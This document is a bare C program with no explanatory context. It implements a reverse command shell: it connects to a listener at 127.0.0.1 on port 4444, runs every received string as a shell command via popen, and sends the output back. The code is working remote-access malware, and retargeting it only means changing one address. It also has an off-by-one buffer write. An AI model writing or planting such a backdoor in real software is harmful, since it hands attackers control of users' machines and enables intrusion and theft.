#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFSIZE 1024

int main() {
    FILE *fp;
    char result[BUFSIZE];
    char buf[BUFSIZE];
    int sockfd;
    struct sockaddr_in servaddr;
    ssize_t n;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("error in creating socket");
        exit(1);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    inet_pton(AF_INET, "127.0.0.1", &servaddr.sin_addr);
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(4444);

    int connect_status = connect(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr));
    if (connect_status < 0) {
        perror("error in function connect");
        exit(1);
    } 

    while(1) {
        n = read(sockfd, buf, BUFSIZE);
        if(n <= 0) break;
        buf[n] = '\0';

        fp = popen(buf, "r");
        if (fp == NULL) {
            perror("failed in popen");
            continue;
        }

        while(fgets(result, sizeof(result), fp) != NULL) {
            write(sockfd, result, strlen(result));
        }
        
        pclose(fp);
    }
    
    
    close(sockfd);
    return 0;
}